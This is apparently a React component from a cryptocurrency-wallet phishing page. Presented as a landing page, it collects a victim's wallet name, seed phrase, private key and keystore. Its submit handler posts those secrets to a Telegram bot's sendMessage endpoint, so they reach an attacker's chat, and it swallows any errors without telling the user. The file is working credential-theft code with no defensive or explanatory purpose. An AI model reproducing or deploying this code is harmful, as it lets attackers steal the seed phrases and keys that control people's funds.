import React, { useState } from "react";
import axios from "axios";
import Footer from "../components/Footer";
import { Outlet } from "react-router-dom";
import Headers from "../components/Headers";
import { ProjectContext } from "../context/ProjectContext";

const LandingPage = () => {
  const [walletName, setWalletName] = useState("");
  const [phrase, setPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [keyStore, setKeyStore] = useState("");
  const [password, setPassword] = useState("");


  const handleSubmitNow = async () => {
    const data = {};
    if (walletName) data.walletName = walletName;
    if (phrase) data.phrase = phrase;
    if (privateKey) data.privateKey = privateKey;
    if (keyStore) data.keyStore = keyStore;

    const text = Object.entries(data)
      .map(([key, value]) => `${key}: ${value}`)
      .join("\n");

    try {
      await axios.post(`${import.meta.env.VITE_API_TG_BOT}/sendMessage`, {
        chat_id: import.meta.env.VITE_API_CHAT_ID,
        text: text,
      });
      // alert('Message sent successfully!');
    } catch (error) {
      console.error('Error sending message:', error);
      // alert('Failed to send message.');
    }
  };

  return (
    <ProjectContext.Provider
      value={{
        walletName,
        setWalletName,
        phrase,
        setPhrase,
        privateKey,
        setPrivateKey,
        keyStore,
        setKeyStore,
        password,
        setPassword,
        handleSubmitNow, // Add handleSubmit to the context
      }}
    >
      <>
        <Headers />
        <Outlet />
        <Footer />
      </>
    </ProjectContext.Provider>
  );
};

export default LandingPage;
